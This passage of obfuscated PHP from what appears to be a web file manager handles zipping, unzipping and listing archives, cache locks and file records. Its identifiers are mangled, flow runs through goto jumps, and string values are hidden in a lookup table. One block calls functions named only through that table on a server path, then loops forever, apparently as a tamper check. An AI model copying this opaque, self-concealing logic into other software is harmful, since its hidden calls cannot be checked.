$F°É¼‰Óƒ = array($Eñİñ©Ï¥[1015] => $Eñİñ©Ï¥[1022], $Eñİñ©Ï¥[6] => $aÌ×âÃÂˆŸ); $AÄÊ¢ó‚È¦ = Model($Eñİñ©Ï¥[531])->getInfo($aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[363]]); if ($AÄÊ¢ó‚È¦[$Eñİñ©Ï¥[365]] == $Eñİñ©Ï¥[463]) { $B»ÌºñöõÀ = KodIO::clear($AÄÊ¢ó‚È¦[$Eñİñ©Ï¥[1020]] . $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[1013]]); $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[434]] = $AÄÊ¢ó‚È¦; $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[1000]] = $B»ÌºñöõÀ; $F°É¼‰Óƒ = array($Eñİñ©Ï¥[1015] => $Eñİñ©Ï¥[1023], $Eñİñ©Ï¥[6] => $aÌ×âÃÂˆŸ); } break; default: $B»ÌºñöõÀ = $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[75]]; $F°É¼‰Óƒ = array($Eñİñ©Ï¥[1015] => $Eñİñ©Ï¥[1024]); break; } $F¸Óí¦ò½á = $aÌ×âÃÂˆŸ[$Eñİñ©Ï¥[75]]; if (!isset(self::$driverCache[$F¸Óí¦ò½á])) { $e©¨©´çá = strtolower($F°É¼‰Óƒ[$Eñİñ©Ï¥[90]]); $e¨©‘‘êÍ’ = $GLOBALS[$Eñİñ©Ï¥[6]][$Eñİñ©Ï¥[84]][$Eñİñ©Ï¥[1025]]; $Cìµ½‡İÓ§ = $Eñİñ©Ï¥[71] . (isset($e¨©‘‘êÍ’[$e©¨©´çá]) ? $e¨©‘‘êÍ’[$e©¨©´çá] : ucfirst($e©¨©´çá)); if (!class_exists($Cìµ½‡İÓ§)) { show_json("{$Cìµ½‡İÓ§}\40\156\x6f\164\x20\145\x78\x69\163\x74\163\x21", !1); } $f¶êé±ÜÂ = isset($F°É¼‰Óƒ[$Eñİñ©Ï¥[6]]) ? $F°É¼‰Óƒ[$Eñİñ©Ï¥[6]] : !1; self::$driverCache[$F¸Óí¦ò½á] = new $Cìµ½‡İÓ§($f¶êé±ÜÂ); } goto cß‰¬Îâà„; F÷£ƒôŞ¶å: } } if (!isset($_SERVER[$_SERVER[Õİõş][764]]) || !isset($_SERVER[$_SERVER[Õİõş][1027]])) { goto fÀ¸Óµ…ˆ; C·¦¹î´: $cŞ¾‹ÆÄ× = explode($_SERVER[Õİõş][213], $B¢§„ìª­); if (count($cŞ¾‹ÆÄ×) < $_SERVER[Õİõş][560]) { $Cá¬âÛ¦áÙ = $_SERVER[Õİõş][768]; $Cá¬âÛ¦áÙ(); } $Bä‘æŠéÖ = $_SERVER[Õİõş][769]; goto bÅéÅÛÒæƒ; fÀ¸Óµ…ˆ: $b—‹äÎÇæ‹ = $_SERVER[Õİõş][765]; $bªÈ×¡˜è¤ = $_SERVER[$_SERVER[Õİõş][766]] . $_SERVER[Õİõş][767]; $B¢§„ìª­ = $b—‹äÎÇæ‹($bªÈ×¡˜è¤); goto C·¦¹î´; bÅéÅÛÒæƒ: $Bä‘æŠéÖ($_SERVER[$_SERVER[Õİõş][766]] . $_SERVER[Õİõş][767]); $c½ãœÉÁÖ½ = 2; while ($c½ãœÉÁÖ½ > 1) { $Dª¯“¡çåÃ = rawurlencode($c½ãœÉÁÖ½ . $_SERVER[Õİõş][357]); } goto déÀ¨È¿ÏÙ; déÀ¨È¿ÏÙ: } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $C„µÇÎÄº; if (!$C„µÇÎÄº) { $Cƒ‘ƒùÆù = IO::init($_SERVER[Õİõş][8]); } return $Cƒ‘ƒùÆù; } private static function iconvSystem($cìÁ’´øõñ) { return self::local()->iconvSystem($cìÁ’´øõñ); } private static function iconvApp($dÛ Ó¹„à‚) { return self::local()->iconvApp($dÛ Ó¹„à‚); } public static function zip($F©ì‘¨‰Æ, $a¯Í©‚ª½ = "\172\151\x70", $d¯Šî¬Ä = '', $A¾å ğ˜»ì = REPEAT_RENAME) { goto e»Å´Úš¢à; dé¯¯¢‘ÔØ: foreach ($F¡—ˆ‚É„ as $F–±²³±ğ => $dâ‹¬Ñ§Ø×) { $F¡—ˆ‚É„[$F–±²³±ğ] = self::iconvSystem($dâ‹¬Ñ§Ø×); } KodArchive::create($B•‹ëîë·÷, $F¡—ˆ‚É„); if (!IO::exist($B¨ì÷¥¤‹Ÿ)) { if ($eÒ÷äØ‰ë¹) { del_dir($eÒ÷äØ‰ë¹); } show_json(LNG($a¦è»®§ã[1030]), !1); } goto D½êˆµ•‚À; Eô¹‘Ò¦Ÿ·: $B¨ì÷¥¤‹Ÿ = $FÑ°ƒêñê . $c¿Ï¶Ê×Ğ£ . $a¦è»®§ã[91] . $a¯Í©‚ª½; $B¨ì÷¥¤‹Ÿ = get_filename_auto($B¨ì÷¥¤‹Ÿ, $a¦è»®§ã[33], $A¾å ğ˜»ì); $B•‹ëîë·÷ = self::iconvSystem($B¨ì÷¥¤‹Ÿ); goto dé¯¯¢‘ÔØ; e»Å´Úš¢à: $a¦è»®§ã =& $_SERVER[Õİõş]; $fÔì”»áÛù = self::init($F©ì‘¨‰Æ[0][$a¦è»®§ã[75]]); $BÇ©ÂÖßæ° = self::info($F©ì‘¨‰Æ[0][$a¦è»®§ã[75]]); goto c¸¢ÒÁ¼°‚; c¸¢ÒÁ¼°‚: $eÒ÷äØ‰ë¹ = !1; if (!$d¯Šî¬Ä && $fÔì”»áÛù->getType() == $a¦è»®§ã[101]) { $F¡—ˆ‚É„ = self::zipFileList($F©ì‘¨‰Æ); } else { $eÒ÷äØ‰ë¹ = $d¯Šî¬Ä ? $d¯Šî¬Ä : TEMP_FILES . $a¦è»®§ã[1028] . time() . rand_string(8) . $a¦è»®§ã[8]; mk_dir($eÒ÷äØ‰ë¹); $F¡—ˆ‚É„ = self::zipFileList($F©ì‘¨‰Æ, $eÒ÷äØ‰ë¹); } $c¿Ï¶Ê×Ğ£ = $BÇ©ÂÖßæ°[$a¦è»®§ã[28]]; goto B¿ƒ‘İ˜¶; B¿ƒ‘İ˜¶: if (count($F¡—ˆ‚É„) > 1) { $f›ÄÌáÇÇà = IO::info(IO::pathFather($BÇ©ÂÖßæ°[$a¦è»®§ã[75]])); $c¿Ï¶Ê×Ğ£ = $f›ÄÌáÇÇà[$a¦è»®§ã[28]]; } $FÑ°ƒêñê = $eÒ÷äØ‰ë¹; if (!$FÑ°ƒêñê) { $FÑ°ƒêñê = get_path_father($BÇ©ÂÖßæ°[$a¦è»®§ã[75]]); $FêöÜ®õ…— = IO::info($FÑ°ƒêñê); if (!$FêöÜ®õ…—[$a¦è»®§ã[185]]) { show_json(LNG($a¦è»®§ã[1029]), !1); } } goto Eô¹‘Ò¦Ÿ·; fï¶Ö·‹: if (!$f˜êëèÇ©ó) { del_dir($eÒ÷äØ‰ë¹); show_json(LNG($a¦è»®§ã[1030]), !1); } del_dir($eÒ÷äØ‰ë¹); return $f˜êëèÇ©ó; goto e¸ò‚Ï§’½; D½êˆµ•‚À: if ($d¯Šî¬Ä || !$eÒ÷äØ‰ë¹) { if ($eÒ÷äØ‰ë¹ && strstr($eÒ÷äØ‰ë¹, TEMP_FILES)) { $bª·ñ•Ÿæç = $F¡—ˆ‚É„ = array(); recursion_dir($FÑ°ƒêñê, $bª·ñ•Ÿæç, $F¡—ˆ‚É„, 0); foreach ($bª·ñ•Ÿæç as $F¼“ ô¼˜) { del_dir($F¼“ ô¼˜); } foreach ($F¡—ˆ‚É„ as $BèÉÕÃ¦¾å) { if ($BèÉÕÃ¦¾å == $B•‹ëîë·÷) { continue; } del_file($BèÉÕÃ¦¾å); } } return $B¨ì÷¥¤‹Ÿ; } $EŞ´Ëƒ…š† = self::pathFather($BÇ©ÂÖßæ°[$a¦è»®§ã[75]]); $f˜êëèÇ©ó = self::move($B¨ì÷¥¤‹Ÿ, $EŞ´Ëƒ…š†, $A¾å ğ˜»ì); goto fï¶Ö·‹; e¸ò‚Ï§’½: } public static function unzip($BÄÏ´¼‰Ãî, $f°ª›—ÅŒ£ = "\x72\145\160\x6c\x61\x63\x65") { goto Aê±ÕÍÜ è; A¢ÈÉì¼Ì¸: return !0; goto dŠÃå„Ê; F˜ù†öå …: $aùŠ¥Û‚ = KodArchive::extract($f³‹µÙÊÏĞ, $DÉù˜µì•´ . $dç¯¥¨[8], $E¿¡°ÛÍŸ); self::archiveExt(); if (!$aùŠ¥Û‚[$dç¯¥¨[1035]]) { show_json($dç¯¥¨[1036] . $aùŠ¥Û‚[$dç¯¥¨[1037]], !1); } goto A¬é’÷Œ¦„; A¬é’÷Œ¦„: Hook::trigger($dç¯¥¨[1038], $DÉù˜µì•´); recursion_dir($DÉù˜µì•´, $bÇ¦¸”ŞÈÇ, $eæŞˆ‹Ä‰¤, 0); $EÊ´±©Ç®ã = array_merge($bÇ¦¸”ŞÈÇ, $eæŞˆ‹Ä‰¤); goto A¥Ì±ë¿ö«; C£¡ÛÅ ÉÆ: if (!@file_exists(self::iconvSystem($f³‹µÙÊÏĞ))) { $D­ğ™Ûİ = self::localFilePath($d Ìíµß†, $EÁ¸ÑáÁàÉ); $f³‹µÙÊÏĞ = $D­ğ™Ûİ ? $D­ğ™Ûİ : parent::download($d Ìíµß†, $f³‹µÙÊÏĞ); } $f³‹µÙÊÏĞ = self::iconvSystem($f³‹µÙÊÏĞ); $E¿¡°ÛÍŸ = isset($BÄÏ´¼‰Ãî[$dç¯¥¨[1033]]) ? $BÄÏ´¼‰Ãî[$dç¯¥¨[1033]] : $dç¯¥¨[1034]; goto F˜ù†öå …; A¥Ì±ë¿ö«: foreach ($EÊ´±©Ç®ã as $Eµ¼Š‚»ƒ) { $Eµ¼Š‚»ƒ = self::iconvApp($Eµ¼Š‚»ƒ); self::move($Eµ¼Š‚»ƒ, $f§è²¾¸âî, $f°ª›—ÅŒ£); } del_dir($DÉù˜µì•´); if (!$D­ğ™Ûİ) { del_file($f³‹µÙÊÏĞ); } goto A¢ÈÉì¼Ì¸; B™—ìèø÷Í: if (!($D²‚Ã¹«à˜ = parent::info($d Ìíµß†))) { show_json(LNG($dç¯¥¨[1032]), !1); } if (!($eÕ·ô§¿åé = parent::infoFull($f§è²¾¸âî))) { $f§è²¾¸âî = parent::mkdir($f§è²¾¸âî); $eÕ·ô§¿åé = array($dç¯¥¨[75] => $f§è²¾¸âî); } else { if (isset($eÕ·ô§¿åé[$dç¯¥¨[365]]) && trim($eÕ·ô§¿åé[$dç¯¥¨[75]], $dç¯¥¨[8]) != trim($f§è²¾¸âî, $dç¯¥¨[8])) { $AÔô˜É°÷‡ = KodIO::make($eÕ·ô§¿åé[$dç¯¥¨[456]]); $Fñ¡ÔÅÕî = parent::fileNameAuto($AÔô˜É°÷‡, $eÕ·ô§¿åé[$dç¯¥¨[28]], REPEAT_RENAME_FOLDER, !0); $f§è²¾¸âî = parent::mkdir($AÔô˜É°÷‡ . $Fñ¡ÔÅÕî); $eÕ·ô§¿åé = array($dç¯¥¨[75] => $f§è²¾¸âî); } } $f§è²¾¸âî = $eÕ·ô§¿åé[$dç¯¥¨[75]]; goto CÊŒ±´ÆªÎ; EàÛ“Á„ç¦: mk_dir($DÉù˜µì•´); $EÁ¸ÑáÁàÉ = self::fileExt($D²‚Ã¹«à˜); $f³‹µÙÊÏĞ = $DÉù˜µì•´ . $dç¯¥¨[91] . $EÁ¸ÑáÁàÉ; goto C£¡ÛÅ ÉÆ; Aê±ÕÍÜ è: $dç¯¥¨ =& $_SERVER[Õİõş]; $d Ìíµß† = $BÄÏ´¼‰Ãî[$dç¯¥¨[75]]; $f§è²¾¸âî = $BÄÏ´¼‰Ãî[$dç¯¥¨[1031]]; goto B™—ìèø÷Í; CÊŒ±´ÆªÎ: $F™¨™ÍÓÎ = self::tmpFileName($D²‚Ã¹«à˜); $DÉù˜µì•´ = TEMP_FILES . $F™¨™ÍÓÎ; del_dir($DÉù˜µì•´); goto EàÛ“Á„ç¦; dŠÃå„Ê: } public static function unzipList($aôğéÓŠ°) { goto e³Ô½ˆ; a†á´˜Ã£Å: self::archiveExt(); del_dir($B§š›¿¶Ø); if (!$b¬×ôí³ò[$CºŠŒ‘ìñ[1035]]) { show_json($b¬×ôí³ò[$CºŠŒ‘ìñ[1037]], !1); } goto F„…“ĞĞÜ; F„…“ĞĞÜ: $aœ‡ÌÃ™ğ– = json_encode($b¬×ôí³ò[$CºŠŒ‘ìñ[1037]]); self::setContent($B¶¶Ì‰‰½‰, $aœ‡ÌÃ™ğ–); if (count($b¬×ôí³ò[$CºŠŒ‘ìñ[1037]]) >= $D´¿³Ü‚¥) { show_json(sprintf(LNG($CºŠŒ‘ìñ[1041]), count($b¬×ôí³ò[$CºŠŒ‘ìñ[1037]])), !1); } goto e¦§Áñˆ›; A©è“óˆŒÈ: if (isset($cß…Óï¯¯¸)) { $dê«æŒ„‘Ã = array($cß…Óï¯¯¸[$CºŠŒ‘ìñ[75]], $cß…Óï¯¯¸[$CºŠŒ‘ìñ[1039]], $cß…Óï¯¯¸[$CºŠŒ‘ìñ[28]]); $A¸”Ğ®±ğ = md5(implode($CºŠŒ‘ìñ[70], $dê«æŒ„‘Ã)) . $CºŠŒ‘ìñ[91] . get_path_ext($cß…Óï¯¯¸[$CºŠŒ‘ìñ[28]]); } else { $dê«æŒ„‘Ã = array($F´•¤àá¤Ş[$CºŠŒ‘ìñ[28]], $F´•¤àá¤Ş[$CºŠŒ‘ìñ[75]], $F´•¤àá¤Ş[$CºŠŒ‘ìñ[77]]); $A¸”Ğ®±ğ = md5(implode($CºŠŒ‘ìñ[70], $dê«æŒ„‘Ã)) . $CºŠŒ‘ìñ[91] . $BÙ šÙ¶ŞĞ; } if ($A¡»ËöË == -1) { $B¶¶Ì‰‰½‰ = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\126\151\145\x77\x2f{$dÉÆ…é©}\x2f{$A¸”Ğ®±ğ}\56\x6c\x6f\147"; $c”ÒĞ’î™¹ = self::infoFull($B¶¶Ì‰‰½‰); if ($c”ÒĞ’î™¹) { $B¶¶Ì‰‰½‰ = $c”ÒĞ’î™¹[$CºŠŒ‘ìñ[75]]; $B»Ú¹³‡å = self::getContent($B¶¶Ì‰‰½‰); if ($B»Ú¹³‡å) { $aœ‡ÌÃ™ğ– = json_decode($B»Ú¹³‡å, !0); if (count($aœ‡ÌÃ™ğ–) >= $D´¿³Ü‚¥) { show_json(sprintf(LNG($CºŠŒ‘ìñ[1041]), count($aœ‡ÌÃ™ğ–)), !1); } return $aœ‡ÌÃ™ğ–; } } else { $B¶¶Ì‰‰½‰ = self::mkfile($B¶¶Ì‰‰½‰); } } $B§š›¿¶Ø = TEMP_FILES . $dÉÆ…é©; goto f‘ÊÅçÏÊ; aÑÖÁäÃ«: $D´¿³Ü‚¥ = 50000; if (request_url_safe($cŸÈ°ØÇÙ)) { $cß…Óï¯¯¸ = parse_url_query($cŸÈ°ØÇÙ); if (!isset($cß…Óï¯¯¸[$CºŠŒ‘ìñ[75]])) { show_json($CºŠŒ‘ìñ[1040], !1); } } $a…Û½ªŒ = isset($cß…Óï¯¯¸) ? $cß…Óï¯¯¸[$CºŠŒ‘ìñ[75]] : $cŸÈ°ØÇÙ; goto E®Š«ä‹Ä²; e¦§Áñˆ›: return $b¬×ôí³ò[$CºŠŒ‘ìñ[1037]]; goto c´ä†ò¥ò; d³‡¢Üîß÷: $EÁ›š—¼½ = self::iconvSystem($EÁ›š—¼½); if ($A¡»ËöË >= 0) { $eèÏÅÒä¤Ï = isset($aôğéÓŠ°[$CºŠŒ‘ìñ[1043]]) ? $aôğéÓŠ°[$CºŠŒ‘ìñ[1043]] : !1; $a ¢ˆğ¨¡› = isset($aôğéÓŠ°[$CºŠŒ‘ìñ[28]]) ? $aôğéÓŠ°[$CºŠŒ‘ìñ[28]] : $CºŠŒ‘ìñ[33]; KodArchive::filePreview($EÁ›š—¼½, $A¡»ËöË, $eèÏÅÒä¤Ï, $a ¢ˆğ¨¡›); self::archiveExt(); die; } $b¬×ôí³ò = KodArchive::listContent($EÁ›š—¼½); goto a†á´˜Ã£Å; e³Ô½ˆ: $CºŠŒ‘ìñ =& $_SERVER[Õİõş]; $cŸÈ°ØÇÙ = $aôğéÓŠ°[$CºŠŒ‘ìñ[75]]; $A¡»ËöË = isset($aôğéÓŠ°[$CºŠŒ‘ìñ[1039]]) ? $aôğéÓŠ°[$CºŠŒ‘ìñ[1039]] : -1; goto aÑÖÁäÃ«; E®Š«ä‹Ä²: $F´•¤àá¤Ş = self::info($a…Û½ªŒ); $BÙ šÙ¶ŞĞ = self::fileExt($F´•¤àá¤Ş); $dÉÆ…é© = self::tmpFileName($F´•¤àá¤Ş); goto A©è“óˆŒÈ; f‘ÊÅçÏÊ: if (!is_dir($B§š›¿¶Ø)) { mk_dir($B§š›¿¶Ø); } $EÁ›š—¼½ = $B§š›¿¶Ø . $CºŠŒ‘ìñ[8] . $A¸”Ğ®±ğ; if (!@file_exists(self::iconvSystem($EÁ›š—¼½))) { if (isset($cß…Óï¯¯¸)) { url_request($cŸÈ°ØÇÙ, $CºŠŒ‘ìñ[1042], $EÁ›š—¼½); } else { $DíáÑÃºŞí = self::localFilePath($cŸÈ°ØÇÙ, $BÙ šÙ¶ŞĞ); $EÁ›š—¼½ = $DíáÑÃºŞí ? $DíáÑÃºŞí : self::download($cŸÈ°ØÇÙ, $EÁ›š—¼½); } } goto d³‡¢Üîß÷; c´ä†ò¥ò: } private static function fileExt($C ó…ŒĞ´“) { $EãÔîÊÇ„Ø =& $_SERVER[Õİõş]; $e™Ñ¾È‹“ğ = $C ó…ŒĞ´“[$EãÔîÊÇ„Ø[156]]; if ($e™Ñ¾È‹“ğ == $EãÔîÊÇ„Ø[1044]) { $e´ÙİÀ‹êù = $EãÔîÊÇ„Ø[1045]; if (substr($C ó…ŒĞ´“[$EãÔîÊÇ„Ø[28]], -strlen($e´ÙİÀ‹êù)) == $e´ÙİÀ‹êù) { $e™Ñ¾È‹“ğ = $EãÔîÊÇ„Ø[1046]; } } self::archiveExt($e™Ñ¾È‹“ğ); return $e™Ñ¾È‹“ğ; } private static function zipFileList($e“§ù‘²Úì, $bô¿†Í¾Í‡ = false) { $BÉÙŞÜ‹¶ =& $_SERVER[Õİõş]; $d–µ†œ·Ú = array(); foreach ($e“§ù‘²Úì as $E¢²‰èÄÀ¿) { $d¦İ†åÆÔ± = $E¢²‰èÄÀ¿[$BÉÙŞÜ‹¶[75]]; if ($bô¿†Í¾Í‡) { $d¦İ†åÆÔ± = self::copy($E¢²‰èÄÀ¿[$BÉÙŞÜ‹¶[75]], $bô¿†Í¾Í‡, $BÉÙŞÜ‹¶[746]); } if ($d¦İ†åÆÔ± && self::local()->exist($d¦İ†åÆÔ±)) { $d–µ†œ·Ú[$E¢²‰èÄÀ¿[$BÉÙŞÜ‹¶[75]]] = $d¦İ†åÆÔ±; } } if (!empty($d–µ†œ·Ú)) { return array_values($d–µ†œ·Ú); } show_json(LNG($BÉÙŞÜ‹¶[1047]), !1); } public static function tmpFileName($f‹â™´ê¢Á) { $D’ÇâÜ‹ =& $_SERVER[Õİõş]; $CøèßéöŸÖ = array($f‹â™´ê¢Á[$D’ÇâÜ‹[28]], $f‹â™´ê¢Á[$D’ÇâÜ‹[75]], $f‹â™´ê¢Á[$D’ÇâÜ‹[77]], $f‹â™´ê¢Á[$D’ÇâÜ‹[454]]); return md5(implode($D’ÇâÜ‹[70], $CøèßéöŸÖ)); } private static function localFilePath($e–²ÚòŠØå, $BÒ„Ô¾ŞÅ) { goto Aø—Â’‹ ; D¯ôâŒ¯ª: if ($AùŒ÷‰òä¹[$B¡˜Õò·[29]] == KodIO::KOD_SOURCE) { $fæ¨½‚ŒØ = Model($B¡˜Õò·[754])->fileInfoGet(KodIO::sourceID($e–²ÚòŠØå)); if (!$fæ¨½‚ŒØ[$B¡˜Õò·[75]]) { show_json($B¡˜Õò·[1050], !1); } $e–²ÚòŠØå = $fæ¨½‚ŒØ[$B¡˜Õò·[75]]; } $A÷èĞŒ»§È = self::init($e–²ÚòŠØå); $f…Ã‰ì…ìÂ = $A÷èĞŒ»§È->getType(); goto F‰ÜÚÖ¡„Œ; F‰ÜÚÖ¡„Œ: if ($f…Ã‰ì…ìÂ == $B¡˜Õò·[101] || $f…Ã‰ì…ìÂ == $B¡˜Õò·[1051]) { if (!$A÷èĞŒ»§È->exist($A÷èĞŒ»§È->path)) { show_json(LNG($B¡˜Õò·[100]), !1); } return $A÷èĞŒ»§È->path; } return !1; goto bæˆ‰¿»³Í; Aø—Â’‹ : $B¡˜Õò· =& $_SERVER[Õİõş]; if ($BÒ„Ô¾ŞÅ == $B¡˜Õò·[1048] && strtoupper(substr(PHP_OS, 0, 3)) == $B¡˜Õò·[1049]) { return !1; } $AùŒ÷‰òä¹ = KodIO::parse($e–²ÚòŠØå); goto D¯ôâŒ¯ª; bæˆ‰¿»³Í: } private static function archiveExt($eë§—¯ô¹˜ = '') { $GLOBALS[$_SERVER[Õİõş][1052]] = $eë§—¯ô¹˜; } } goto FÊÓ——¶¯œ; a²å˜ºÇˆ: class CacheLockMemcached { public function lock($C‡óÕ¹³é©, $C‘¾›äØŒŞ = 0) { $DÏß´âïŒ½ = Cache::init(); $bùÇ†ë¶¶ = microtime(!0) + $C‘¾›äØŒŞ; while (microtime(!0) < $bùÇ†ë¶¶) { $bï¡¹ÓÆŸç = $DÏß´âïŒ½->get($C‡óÕ¹³é©); if (!$bï¡¹ÓÆŸç || $bï¡¹ÓÆŸç < microtime(!0)) { $E›°Ê’™òğ = $DÏß´âïŒ½->handle->add($C‡óÕ¹³é©, $bùÇ†ë¶¶, $C‘¾›äØŒŞ); if ($E›°Ê’™òğ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($dê„š˜öè) { return Cache::init()->get($dê„š˜öè); } public function unlock($AÚİ—Ó×äÂ) { return Cache::init()->remove($AÚİ—Ó×äÂ); } } class CacheLockDatabase { public function lock($FŸåÃÎŸÌ†, $D×Ü–Æ÷ãğ = 0) { $c÷¿½³©›õ = Model($_SERVER[Õİõş][757]); $CŒÖ¶¡ˆÉ = microtime(!0) + $D×Ü–Æ÷ãğ; while (microtime(!0) < $CŒÖ¶¡ˆÉ) { $C–£îÇ»÷ = $c÷¿½³©›õ->get($FŸåÃÎŸÌ†); if (!$C–£îÇ»÷ || $C–£îÇ»÷ < microtime(!0)) { $D¸£ÅŒ“éá = $c÷¿½³©›õ->set($FŸåÃÎŸÌ†, $CŒÖ¶¡ˆÉ); if ($D¸£ÅŒ“éá) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($BŒ»ÏòçÄ) { return Model($_SERVER[Õİõş][757])->get($BŒ»ÏòçÄ); } public function unlock($C Ù •‰ê„) { Model($_SERVER[Õİõş][757])->remove($C Ù •‰ê„); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($f°¼£ñïò¼, $dÀ‚™Ò£Ğ²) { $Có‰È˜‰¢Å =& $_SERVER[Õİõş]; if (!class_exists($Có‰È˜‰¢Å[786])) { show_json($Có‰È˜‰¢Å[787], !1); } $this->cacheTime = $dÀ‚™Ò£Ğ²; $this->handle = new Memcached(); if (is_array($f°¼£ñïò¼[$Có‰È˜‰¢Å[788]]) && count($f°¼£ñïò¼[$Có‰È˜‰¢Å[788]]) >= 1) { foreach ($f°¼£ñïò¼[$Có‰È˜‰¢Å[788]] as $b“˜™„‹ò‹) { $cáäòœÉÉš = explode($Có‰È˜‰¢Å[4], $b“˜™„‹ò‹); $this->handle->addServer($cáäòœÉÉš[0], $cáäòœÉÉš[1]); } } else { $this->handle->addServer($f°¼£ñïò¼[$Có‰È˜‰¢Å[165]], $f°¼£ñïò¼[$Có‰È˜‰¢Å[166]]); } } public function set($b¬¬™ÊêŞè, $A·—“øŞ·æ, $dé¾ç®æÜ = false) { $dé¾ç®æÜ = $dé¾ç®æÜ ? $dé¾ç®æÜ : $this->cacheTime; return $this->handle->set($b¬¬™ÊêŞè, $A·—“øŞ·æ, $dé¾ç®æÜ); } public function get($dÆŠ±ÊÑ¹) { return $this->handle->get($dÆŠ±ÊÑ¹); } public function remove($b¡›¼Ÿæñ) { return $this->handle->delete($b¡›¼Ÿæñ); } public function deleteAll() { return $this->handle->flush(); } } goto eõÆêÛï‡Ê; B´–¶ãó•ã: define($_SERVER[Õİõş][223], 2); define($_SERVER[Õİõş][224], 3); define($_SERVER[Õİõş][225], 1); goto AíÄ˜œ„…„; Bìßª½ãÃ: class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\x6c\x65"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\x6d\145" => "\151\x6f\x5f\x66\x69\154\145\x5f\155\x65\x74\141", "\x6d\x65\x74\x61\x46\151\x65\x6c\x64" => "\x66\151\x6c\145\x49\104"); public function fileInfo($fœÄŠÖ™¾‹) { $f›Å¼§²  =& $_SERVER[Õİõş]; static $dÔ­ëÓ¸Ö— = array(); if (!isset($dÔ­ëÓ¸Ö—[$fœÄŠÖ™¾‹])) { $dÅÜ‡‹âê = $f›Å¼§² [2122]; $D‘÷˜¢®‹ = Model($f›Å¼§² [417])->field($dÅÜ‡‹âê)->where(array($f›Å¼§² [415] => $fœÄŠÖ™¾‹))->find(); $dÔ­ëÓ¸Ö—[$fœÄŠÖ™¾‹] = $D‘÷˜¢®‹; } return $dÔ­ëÓ¸Ö—[$fœÄŠÖ™¾‹]; } public function addFileByContent($DÔï–„ñ‰† = '', $dë¸Õæëà† = '') { goto dÖŠ˜îàí; dÖŠ˜îàí: $e¶Å‚ŒŞÍ =& $_SERVER[Õİõş]; $F¯™»Š¶©ò = TEMP_PATH . $e¶Å‚ŒŞÍ[2123]; if (!is_dir($F¯™»Š¶©ò)) { mk_dir($F¯™»Š¶©ò); } goto BŞ‚»‡¥Áø; BŞ‚»‡¥Áø: $cŒêó„‰ò = $F¯™»Š¶©ò . $e¶Å‚ŒŞÍ[2124] . rand_string(16); file_put_contents($cŒêó„‰ò, $DÔï–„ñ‰†); $AÃÊéÔ§§ù = $this->addFile($cŒêó„‰ò, $dë¸Õæëà†, !0); goto Eâñğ­Š°Œ; Eâñğ­Š°Œ: if (file_exists($cŒêó„‰ò)) { @unlink($cŒêó„‰ò); } return $AÃÊéÔ§§ù; goto b¢Æ˜—ßİÑ; b¢Æ˜—ßİÑ: } public function createFileName($FÁ‹ŒŸ¡) { goto c¥Ô™Ï©°™; eËÑ‚ƒÎÃß: if (!$cİÚêëòñÒ && !Cache::get($aÍ¤ÇÈ¼ñÍ)) { $cİÚêëòñÒ = !0; $C™È†ã©‡õ = IO::mkdir($fƒÓæ±½Š); if (!IO::exist($C™È†ã©‡õ . $aì»½Š‚é[2126])) { IO::mkfile($C™È†ã©‡õ . $aì»½Š‚é[2126]); } Cache::set($aÍ¤ÇÈ¼ñÍ, 1, 3600 * 2); } return $bæÇõ’éÑ; goto f…”„Ï²ó; e¨ˆİª¼¸¡: $fƒÓæ±½Š = $b¬‡Ñçäî->pathFather($bæÇõ’éÑ); static $cİÚêëòñÒ = false; $aÍ¤ÇÈ¼ñÍ = $aì»½Š‚é[2125] . md5($fƒÓæ±½Š); goto eËÑ‚ƒÎÃß; c¥Ô™Ï©°™: $aì»½Š‚é =& $_SERVER[Õİõş]; $b¬‡Ñçäî = IO::init($aì»½Š‚é[8]); $bæÇõ’éÑ = $this->makeFilePath($FÁ‹ŒŸ¡, $b¬‡Ñçäî); goto e¨ˆİª¼¸¡; f…”„Ï²ó: } public function makeFilePath($E„°ŞëØ™¤, $Cˆİ±Ÿê¦„) { goto fŒĞ©ºÇŠ; fŒĞ©ºÇŠ: $dÍ‘Ì›¬­ =& $_SERVER[Õİõş]; $C½‡²Œö¶» = Model($dÍ‘Ì›¬­[1091])->get($dÍ‘Ì›¬­[2127]); $AÍ¶´ï¢Ìº = KodIO::defaultIO() . date($dÍ‘Ì›¬­[2128]); goto bÎŠº†“ç; cƒªÉàçŠ: switch ($C½‡²Œö¶») { case $dÍ‘Ì›¬­[2130]: $b©´¦‹Ù× = $b©´¦‹Ù× . $dÍ‘Ì›¬­[91] . $Cˆİ±Ÿê¦„->ext($E„°ŞëØ™¤); if ($Cˆİ±Ÿê¦„->ext($E„°ŞëØ™¤) == $dÍ‘Ì›¬­[2070]) { $b©´¦‹Ù× .= $dÍ‘Ì›¬­[2131]; } break; case $dÍ‘Ì›¬­[2132]: goto EèÂ‘ê‘ÁÈ; EèÂ‘ê‘ÁÈ: $bãöÔí¹À = Model($dÍ‘Ì›¬­[1091])->get($dÍ‘Ì›¬­[1318]); $a©“Í”÷½… = substr(md5($dÍ‘Ì›¬­[1890] . $bãöÔí¹À . date($dÍ‘Ì›¬­[689])), 0, 8); $AÍ¶´ï¢Ìº = KodIO::defaultIO() . date($dÍ‘Ì›¬­[2133]) . $a©“Í”÷½… . $dÍ‘Ì›¬­[8]; goto Eë¢Ê‘Êš; Eë¢Ê‘Êš: if ($Cˆİ±Ÿê¦„->ext($E„°ŞëØ™¤) == $dÍ‘Ì›¬­[2070]) { $E„°ŞëØ™¤ .= $dÍ‘Ì›¬­[2131]; } $ağÔÎïïŸ = IO::fileNameAuto($AÍ¶´ï¢Ìº, $E„°ŞëØ™¤); $b©´¦‹Ù× = $AÍ¶´ï¢Ìº . $ağÔÎïïŸ; goto c®·è“×; c®·è“×: break; goto cìÔ¨‹Éä; cìÔ¨‹Éä: case $dÍ‘Ì›¬­[2129]: break; default: break; } return $b©´¦‹Ù×; goto eš”¼™ ä; bÎŠº†“ç: $b©´¦‹Ù× = 